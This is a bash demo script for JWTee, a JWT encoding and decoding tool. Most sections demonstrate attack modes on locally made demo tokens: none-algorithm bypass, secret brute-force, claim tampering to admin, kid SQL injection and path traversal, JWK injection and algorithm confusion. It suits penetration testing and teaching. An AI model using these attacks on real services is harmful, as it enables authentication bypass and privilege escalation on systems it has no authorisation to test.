#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────
# JWTee — examples.sh
# Runnable demo of every feature. Works after global install
# or from the repo directory.
#
# Usage:
#   chmod +x examples.sh
#   ./examples.sh
#
# Made by Alham Rizvi
# ─────────────────────────────────────────────────────────────

# Use 'jwtee' if installed globally, fall back to local script
if command -v jwtee &>/dev/null; then
    JWTEE="jwtee"
elif [ -f "./JWTee.py" ]; then
    JWTEE="python3 ./JWTee.py"
else
    echo "Error: jwtee not found. Install it globally or run from the repo folder."
    exit 1
fi

SEP="────────────────────────────────────────────────"

section() {
    echo ""
    echo "$SEP"
    echo "  $1"
    echo "$SEP"
}

pause() {
    echo ""
    read -rp "  Press Enter to continue..." _
    echo ""
}

clear
echo ""
echo "  JWTee — Live Demo"
echo "  Every command shown here is real and produces real output."
echo "  Made by Alham Rizvi"
echo ""
pause


# ── 1. ENCODE ────────────────────────────────────────────────
section "1. Encode a JWT (HS256)"

echo "  Command:"
echo '  jwtee encode '"'"'{"sub":"alham","role":"user","uid":1001}'"'"' --secret "mysecret" --alg HS256'
echo ""

TOKEN=$($JWTEE encode '{"sub":"alham","role":"user","uid":1001}' --secret "mysecret" --alg HS256 2>&1 | grep '^eyJ' | head -1)
$JWTEE encode '{"sub":"alham","role":"user","uid":1001}' --secret "mysecret" --alg HS256

echo "  Saved token to: \$TOKEN"
pause


# ── 2. DECODE ────────────────────────────────────────────────
section "2. Decode the token"

echo "  Command:"
echo "  jwtee decode \$TOKEN"
echo ""
$JWTEE decode "$TOKEN"
pause


# ── 3. VERIFY ────────────────────────────────────────────────
section "3. Verify HMAC signature"

echo "  Correct secret:"
echo '  jwtee decode $TOKEN --verify --secret "mysecret"'
echo ""
$JWTEE decode "$TOKEN" --verify --secret "mysecret"

echo "  Wrong secret:"
echo '  jwtee decode $TOKEN --verify --secret "wrongsecret"'
echo ""
$JWTEE decode "$TOKEN" --verify --secret "wrongsecret"
pause


# ── 4. SENSITIVE CLAIMS ───────────────────────────────────────
section "4. Sensitive & interesting claim detection"

echo "  Encoding a token with password and admin fields..."
echo ""
TSENS=$($JWTEE encode '{"sub":"user99","password":"p@ssw0rd","admin":false,"role":"viewer"}' --secret "x" --alg HS256 2>&1 | grep '^eyJ' | head -1)
$JWTEE decode "$TSENS"
pause


# ── 5. EXPIRED TOKEN ─────────────────────────────────────────
section "5. Expired token detection"

echo "  Encoding a token with exp in the past (Unix 1000000 = 1970)..."
echo ""
TEXP=$($JWTEE encode '{"sub":"olduser","exp":1000000}' --secret "x" --alg HS256 2>&1 | grep '^eyJ' | head -1)
$JWTEE decode "$TEXP"
pause


# ── 6. ENCODE none-ALG ────────────────────────────────────────
section "6. Encode with none algorithm (no signature)"

echo "  Command:"
echo '  jwtee encode '"'"'{"sub":"admin","role":"admin"}'"'"' --alg none'
echo ""
$JWTEE encode '{"sub":"admin","role":"admin"}' --alg none
pause


# ── 7. ATTACK: none BYPASS ───────────────────────────────────
section "7. Attack — none algorithm bypass"

echo "  Strips the signature and generates 4 none-alg variants."
echo "  Try each one against the target server."
echo ""
echo "  Command:"
echo "  jwtee attack --token \$TOKEN --type none"
echo ""
$JWTEE attack --token "$TOKEN" --type none
pause


# ── 8. ATTACK: BRUTE-FORCE ────────────────────────────────────
section "8. Attack — secret brute-force (dictionary)"

echo "  Creating a token signed with secret 'secret123'..."
TWEAKTOKEN=$($JWTEE encode '{"sub":"ctfuser","role":"player"}' --secret "secret123" --alg HS256 2>&1 | grep '^eyJ' | head -1)
echo "  Token: $TWEAKTOKEN"
echo ""

echo "  Creating mini wordlist with the answer in it..."
printf "password\nadmin\nsecret123\nletmein\n" > /tmp/demo_wordlist.txt
echo "  Wordlist: password, admin, secret123, letmein"
echo ""

echo "  Command:"
echo "  jwtee attack --token \$TOKEN --type brute --wordlist /tmp/demo_wordlist.txt"
echo ""
$JWTEE attack --token "$TWEAKTOKEN" --type brute --wordlist /tmp/demo_wordlist.txt
pause


# ── 9. ATTACK: BRUTE-FORCE RAW ───────────────────────────────
section "9. Attack — raw brute-force (short secret)"

echo "  Token signed with 2-char secret 'ab'..."
TSHORT=$($JWTEE encode '{"sub":"ctf","flag":"find_the_secret"}' --secret "ab" --alg HS256 2>&1 | grep '^eyJ' | head -1)
echo ""
echo "  Command:"
echo "  jwtee attack --token \$TOKEN --type brute --max-len 2"
echo ""
$JWTEE attack --token "$TSHORT" --type brute --max-len 2
pause


# ── 10. ATTACK: CLAIM TAMPER ─────────────────────────────────
section "10. Attack — claim tampering"

echo "  Using the cracked secret 'secret123' to tamper claims..."
echo ""
echo "  Command:"
echo "  jwtee attack --token \$TOKEN --type tamper --secret 'secret123' --claims '{\"role\":\"admin\",\"admin\":true}'"
echo ""
$JWTEE attack --token "$TWEAKTOKEN" --type tamper --secret "secret123" --claims '{"role":"admin","admin":true}'
pause


# ── 11. ATTACK: kid INJECTION ────────────────────────────────
section "11. Attack — kid header injection"

echo "  Generates SQL injection + path traversal payloads in kid field."
echo "  All tokens signed with empty string (matches /dev/null key lookup)."
echo ""
echo "  Command:"
echo "  jwtee attack --token \$TOKEN --type kid"
echo ""
$JWTEE attack --token "$TOKEN" --type kid
pause


# ── 12. ATTACK: JWK INJECTION ────────────────────────────────
section "12. Attack — JWK header injection"

echo "  Embeds an attacker-controlled key in the JWT header."
echo "  Vulnerable libs trust the embedded key over the server's key."
echo ""
echo "  Command:"
echo "  jwtee attack --token \$TOKEN --type jwk"
echo ""
$JWTEE attack --token "$TOKEN" --type jwk
pause


# ── 13. ATTACK: ALG CONFUSION ────────────────────────────────
section "13. Attack — algorithm confusion (RS256 -> HS256)"

echo "  Shows exploitation steps. Pass --pubkey pubkey.pem to generate token."
echo ""
echo "  Command:"
echo "  jwtee attack --token \$TOKEN --type alg_confusion"
echo ""
$JWTEE attack --token "$TOKEN" --type alg_confusion
pause


# ── 14. CHECKLIST ─────────────────────────────────────────────
section "14. Bug bounty checklist"

echo "  Analyzes a token and shows which attacks are worth trying."
echo ""
echo "  Command:"
echo "  jwtee checklist \$TOKEN"
echo ""
$JWTEE checklist "$TOKEN"
pause


# ── 15. FILE EMBED ────────────────────────────────────────────
section "15. Embed a file into a JWT"

echo "  Creating a demo file with a fake flag..."
echo "CTF{jwt_file_exfil_demo}" > /tmp/flag_demo.txt

echo "  Command:"
echo "  jwtee encode-file flag_demo.txt --secret 'filekey' --output /tmp/flag_demo.jwt"
echo ""
$JWTEE encode-file /tmp/flag_demo.txt --secret "filekey" --output /tmp/flag_demo.jwt

echo ""
echo "  Token saved to /tmp/flag_demo.jwt"
echo "  First 80 chars: $(head -c 80 /tmp/flag_demo.jwt)..."
pause


# ── 16. FILE RECOVER ──────────────────────────────────────────
section "16. Recover a file from a JWT"

echo "  Command:"
echo "  jwtee decode-file @/tmp/flag_demo.jwt --out /tmp/recovered/ --verify --secret 'filekey'"
echo ""
mkdir -p /tmp/recovered
$JWTEE decode-file @/tmp/flag_demo.jwt --out /tmp/recovered/ --verify --secret "filekey"

echo ""
echo "  Recovered file contents:"
cat /tmp/recovered/flag_demo.txt
pause


# ── 17. BINARY FILE ROUND-TRIP ────────────────────────────────
section "17. Binary file round-trip (any file type works)"

echo "  Generating a random 1KB binary file..."
dd if=/dev/urandom bs=1024 count=1 of=/tmp/binary_demo.bin 2>/dev/null
ORIG_HASH=$(sha256sum /tmp/binary_demo.bin | cut -d' ' -f1)
echo "  Original SHA256: $ORIG_HASH"
echo ""

echo "  Embedding into JWT..."
$JWTEE encode-file /tmp/binary_demo.bin --secret "binarykey" --output /tmp/binary_demo.jwt > /dev/null

echo "  Recovering..."
$JWTEE decode-file @/tmp/binary_demo.jwt --out /tmp/recovered_bin/ --verify --secret "binarykey" > /dev/null

RECOVERED_HASH=$(sha256sum /tmp/recovered_bin/binary_demo.bin 2>/dev/null | cut -d' ' -f1)
echo "  Recovered SHA256: $RECOVERED_HASH"
echo ""

if [ "$ORIG_HASH" = "$RECOVERED_HASH" ]; then
    echo "  SHA256 match — binary file perfectly recovered."
else
    echo "  MISMATCH — something went wrong."
fi
pause


# ── DONE ──────────────────────────────────────────────────────
section "Done"

echo "  All features demonstrated."
echo ""
echo "  Quick reference:"
echo "    jwtee decode <token>"
echo "    jwtee encode '<json>' --secret <secret> --alg HS256"
echo "    jwtee attack --token <token> --type all"
echo "    jwtee checklist <token>"
echo "    jwtee encode-file <file> --secret <secret> --output token.jwt"
echo "    jwtee decode-file @token.jwt --out ./recovered/"
echo ""
echo "  GitHub: https://github.com/alhamrizvi-cloud/JWTee"
echo "  Made by Alham Rizvi"
echo ""

# Cleanup temp files
rm -f /tmp/demo_wordlist.txt /tmp/flag_demo.txt /tmp/flag_demo.jwt \
       /tmp/binary_demo.bin /tmp/binary_demo.jwt
rm -rf /tmp/recovered /tmp/recovered_bin
